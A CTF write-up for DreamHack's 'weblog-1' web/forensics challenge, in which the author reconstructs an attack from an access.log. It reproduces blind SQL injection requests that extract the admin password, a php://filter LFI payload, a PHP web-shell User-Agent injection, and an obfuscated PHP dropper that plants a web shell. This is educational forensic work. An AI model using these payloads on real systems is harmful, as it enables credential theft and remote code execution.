# weblog-1 — DreamHack

> **Room / Challenge:** weblog-1 (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** weblog-1 (web)
- **Link**: `https://dreamhack.io/wargame/challenges/71`
- **Level:** `2`
- **Date:** `14-11-2025`

---

## Goal

Examining the source code and access.log to answer questions then get the flag.

## My Solution

This challenge is a web challenge with a mix with forensics challenge.

**First question: Please enter the password for the admin account that was stolen by the attacker.**

In the `access.log` scroll down we can see a bunch of requests of blind SQL Injection:

```
172.17.0.1 - - [02/Jun/2020:09:50:13 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%202,1))=99,%20(select%201%20union%20select%202),%200) HTTP/1.1" 200 841 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

This request make a SQL command in `/board.php`:

```
/board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%202,1))=99,%20(select%201%20union%20select%202),%200)
```

This requests will concat the username and password to `username:password` so if `admin:..password..` takes `d` compares to 99 ASCII `c`, it false so returns `200` status code.

```
172.17.0.1 - - [02/Jun/2020:09:50:13 +0000] "GET /board.php?sort=if(ord(substr((select%20group_concat(username,0x3a,password)%20from%20users),%202,1))=100,%20(select%201%20union%20select%202),%200) HTTP/1.1" 500 1192 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

This requests will concat the username and password to `username:password` so if `admin:..password..` takes `d` compares to 100 ASCII `d`, it true so returns `500` status code. The attacker continues to blind SQL Injection the password and the final is:

```
admin:Th1s_1s_Adm1n_P@SS
```

**Second question: Please provide the payload that the attacker used to extract the config.php code.**
Searching the `access.log` with term `config.php` found this request:

```
172.17.0.1 - - [02/Jun/2020:09:54:18 +0000] "GET /admin/?page=php://filter/convert.base64-encode/resource=../config.php HTTP/1.1" 200 986 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

The attacker leverage the `/admin` route and add use the payload `php://filter/convert.base64-encode/resource=../config.php` received 200 status code. Use that to answer question.

**Third question: Please enter the full path to the file used in the code execution attack via the LFI vulnerability (including the full path name).**
In a log-poisoning LFI attack. Attacker sends a request with malicious PHP in the User-Agent:

```
User-Agent: <?php system($_GET['cmd']); ?>
```

```
172.17.0.1 - - [02/Jun/2020:09:55:39 +0000] "GET /admin/?page=/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732 HTTP/1.1" 200 735 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

Answer: `/var/lib/php/sessions/sess_ag4l8a5tbv8bkgqe9b9ull5732`

**Fourth question: Please enter the path to the generated web shell (full path including file name).**

Found this strange request in `access.log`:

```
/admin/?page=memo.php&memo=%3C?php%20function%20m($l,$T=0){$K=date(%27Y-m-d%27);$_=strlen($l);$__=strlen($K);for($i=0;$i%3C$_;$i%2b%2b){for($j=0;$j%3C$__;%20$j%2b%2b){if($T){$l[$i]=$K[$j]^$l[$i];}else{$l[$i]=$l[$i]^$K[$j];}}}return%20$l;}%20m(%27bmha[tqp[gkjpajpw%27)(m(%27%2brev%2bsss%2blpih%2bqthke`w%2bmiecaw*tlt%27),m(%278;tlt$lae`av,%26LPPT%2b5*5$040$Jkp$Bkqj`%26-?w}wpai,%20[CAP_%26g%26Y-?%27));%20?%3E
```

The code is obfuscated:

```php
<?php
function m($l,$T=0){
$K=date('Y-m-d');
$_=strlen($l);
$__=strlen($K);
for($i=0;$i<$_;$i++){
for($j=0;$j<$__; $j++){
if($T){
$l[$i]=$K[$j]^$l[$i];
}
else{
$l[$i]=$l[$i]^$K[$j];
}
}
}
return $l;
}
echo m('bmha[tqp[gkjpajpw');
echo m('+rev+sss+lpih+qthke`w+miecaw*tlt');
echo m('8;tlt$lae`av,&LPPT+5*5$040$Jkp$Bkqj`&-?w}wpai, [CAP_&g&Y-?');
?>
```

![Guide image](./screenshots/1.png)

Here to make the code works we have to change the date of the request made:

```
$K=date('Y-m-d'); -> $K='2020-06-02';
```

![Guide image](./screenshots/2.png)

Answer: `/var/www/html/uploads/images.php`

**Fifth question: Please enter the first command executed through the created web shell.**
Search `images.php` found this request:

```
172.17.0.1 - - [02/Jun/2020:09:56:32 +0000] "GET /uploads/images.php?c=whoami HTTP/1.1" 404 490 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
```

Answer: `whoami`

![Guide image](./screenshots/3.png)
